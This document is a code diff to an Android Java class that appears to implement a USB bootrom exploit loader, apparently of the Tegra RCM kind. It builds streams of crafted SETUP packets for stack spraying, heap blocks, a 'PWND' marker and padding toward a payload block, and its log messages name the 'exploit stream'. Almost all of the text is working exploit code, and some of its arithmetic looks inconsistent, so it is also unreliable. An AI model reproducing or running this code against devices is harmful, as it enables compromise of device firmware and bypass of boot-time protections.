@@ -11,8 +11,7 @@ import android.hardware.usb.UsbDeviceConnection;
 import android.hardware.usb.UsbInterface;
 import android.hardware.usb.UsbManager;
 
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
+import java.io.ByteArrayOutputStream;
 import java.util.Arrays;
 
 public class PrimaryLoader implements USBDevHandler {
@@ -21,7 +20,8 @@ public class PrimaryLoader implements USBDevHandler {
     private static final int PAYLOAD_LOAD_BLOCK = 0x40020000;
     private static final int MAX_LENGTH = 0x30298;
 
-    private static final int SETUP_VENDOR_OUT = UsbConstants.USB_DIR_OUT | UsbConstants.USB_TYPE_VENDOR | 0x00; // recipient device
+    private static final int GET_STATUS_REQUEST_TYPE = UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_STANDARD | 0x00; // standard device GET_STATUS
+    private static final int SETUP_VENDOR_OUT_DEVICE = UsbConstants.USB_DIR_OUT | UsbConstants.USB_TYPE_VENDOR | 0x00; // vendor-specific, device recipient
     private static final int REQUEST_HEADER = 0x10;
     private static final int REQUEST_RESERVED = 0x11;
     private static final int REQUEST_STACK_SPRAY = 0x12;
@@ -88,7 +88,7 @@ public class PrimaryLoader implements USBDevHandler {
 
             /* Step 1: Probe device with a standard GET_STATUS control request */
             byte[] deviceStatus = new byte[2];
-            int statusBytes = conn.controlTransfer(UsbConstants.USB_DIR_IN | UsbConstants.USB_TYPE_STANDARD | 0x00,
+            int statusBytes = conn.controlTransfer(GET_STATUS_REQUEST_TYPE,
                     0x00, 0, 0, deviceStatus, deviceStatus.length, 999);
             Logger.log(context, "[*] controlTransfer GET_STATUS returned " + statusBytes + " bytes");
             if (statusBytes > 0) {
@@ -154,17 +154,18 @@ public class PrimaryLoader implements USBDevHandler {
     }
 
     private int sendPayloadViaControl(UsbDeviceConnection conn, byte[] payload, Context context) {
+        if (payload.length % 8 != 0) {
+            Logger.log(context, "[-] Invalid payload length: not aligned to 8-byte SETUP packets");
+            return -1;
+        }
+
         int totalSent = 0;
         int packetIndex = 0;
         int offset = 0;
 
         while (offset < payload.length) {
-            int chunkSize = Math.min(8, payload.length - offset);
             byte[] chunk = new byte[8];
-            System.arraycopy(payload, offset, chunk, 0, chunkSize);
-            if (chunkSize < 8) {
-                Arrays.fill(chunk, chunkSize, 8, (byte) 0);
-            }
+            System.arraycopy(payload, offset, chunk, 0, 8);
 
             int requestType = chunk[0] & 0xFF;
             int request = chunk[1] & 0xFF;
@@ -194,12 +195,12 @@ public class PrimaryLoader implements USBDevHandler {
 
             Logger.log(context, "[*] controlTransfer returned " + result + " for packet " + packetIndex);
             if (result < 0) {
-                Logger.log(context, "[!] Setup packet " + packetIndex + " failed; continuing for exploit stream");
-            } else {
-                totalSent += chunkSize;
+                Logger.log(context, "[-] Setup packet " + packetIndex + " failed; aborting exploit stream");
+                return -1;
             }
 
-            offset += chunkSize;
+            totalSent += 8;
+            offset += 8;
             packetIndex++;
         }
 
@@ -207,44 +208,43 @@ public class PrimaryLoader implements USBDevHandler {
     }
 
     private byte[] buildSetupPacketStream(int maxLength, long rcmAddr, long intermezzoLoc, long payloadBlock, Context context) {
-        ByteBuffer stream = ByteBuffer.allocate(maxLength);
-        stream.order(ByteOrder.LITTLE_ENDIAN);
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();
 
-        stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
+        stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                 REQUEST_HEADER,
                 maxLength & 0xFFFF,
                 (maxLength >> 16) & 0xFFFF,
                 0));
-        Logger.log(context, "[*] Added initial setup packet encoding maxLength");
+        Logger.log(context, "[*] Added initial setup packet encoding MAX_LENGTH=" + maxLength);
 
         int reservedPackets = (676 + 7) / 8;
         for (int i = 0; i < reservedPackets; i++) {
-            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
+            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                     REQUEST_RESERVED,
                     0,
                     0,
                     0));
         }
-        Logger.log(context, "[*] Added " + reservedPackets + " reserved header setup packets");
+        Logger.log(context, "[*] Added " + reservedPackets + " reserved SETUP packets");
 
         int stackFillCount = (int) ((intermezzoLoc - rcmAddr) / 4);
         for (int i = 0; i < stackFillCount; i++) {
-            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
+            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                     REQUEST_STACK_SPRAY,
                     (int) (intermezzoLoc & 0xFFFF),
                     (int) ((intermezzoLoc >> 16) & 0xFFFF),
                     0));
         }
-        Logger.log(context, "[*] Added " + stackFillCount + " explicit stack smash setup packets");
+        Logger.log(context, "[*] Added " + stackFillCount + " stack spray SETUP packets");
 
         for (long blk : T8Constants.HEAP_BLOCKS) {
-            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
+            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                     REQUEST_HEAP_BLOCK,
                     (int) (blk & 0xFFFF),
                     (int) ((blk >> 16) & 0xFFFF),
                     0));
         }
-        Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block setup packets");
+        Logger.log(context, "[*] Added " + T8Constants.HEAP_BLOCKS.length + " heap block SETUP packets");
 
         try {
             byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
@@ -253,37 +253,31 @@ public class PrimaryLoader implements USBDevHandler {
                 for (int j = 0; j < 4 && i + j < pw.length; j++) {
                     chunk |= (pw[i + j] & 0xFF) << (8 * j);
                 }
-                stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
+                stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                         REQUEST_PWND,
                         chunk & 0xFFFF,
                         (chunk >> 16) & 0xFFFF,
                         0));
             }
-            Logger.log(context, "[*] Added PWND string as explicit setup packet payload");
+            Logger.log(context, "[*] Added PWND string as explicit SETUP payload packets");
         } catch (Exception e) {
-            Logger.log(context, "[-] Failed to append PWND string as setup packets: " + e.toString());
+            Logger.log(context, "[-] Failed to append PWND string as SETUP packets: " + e.toString());
         }
 
-        int pad = (int) Math.max(0, Math.min(maxLength, payloadBlock - intermezzoLoc));
-        int paddingPackets = (pad + 7) / 8;
+        int paddingPackets = (int) ((payloadBlock - intermezzoLoc) / 8);
+        paddingPackets = Math.max(0, paddingPackets);
         for (int i = 0; i < paddingPackets; i++) {
-            stream.put(makeSetupPacket(SETUP_VENDOR_OUT,
+            stream.write(makeSetupPacket(SETUP_VENDOR_OUT_DEVICE,
                     REQUEST_PADDING,
                     0,
                     0,
                     0));
         }
-        Logger.log(context, "[*] Added " + paddingPackets + " padding setup packets to reach payload block");
+        Logger.log(context, "[*] Added " + paddingPackets + " padding SETUP packets to align to payload block");
 
-        int remaining = maxLength - stream.position();
-        if (remaining > 0) {
-            byte[] trailing = new byte[remaining];
-            Arrays.fill(trailing, (byte) 0xAA);
-            stream.put(trailing);
-            Logger.log(context, "[*] Filled remaining " + remaining + " bytes with debug pattern");
-        }
-
-        return stream.array();
+        byte[] streamBytes = stream.toByteArray();
+        Logger.log(context, "[*] Built " + (streamBytes.length / 8) + " explicit SETUP packets (" + streamBytes.length + " bytes)");
+        return streamBytes;
     }
 
     private byte[] makeSetupPacket(int requestType, int request, int value, int index, int length) {
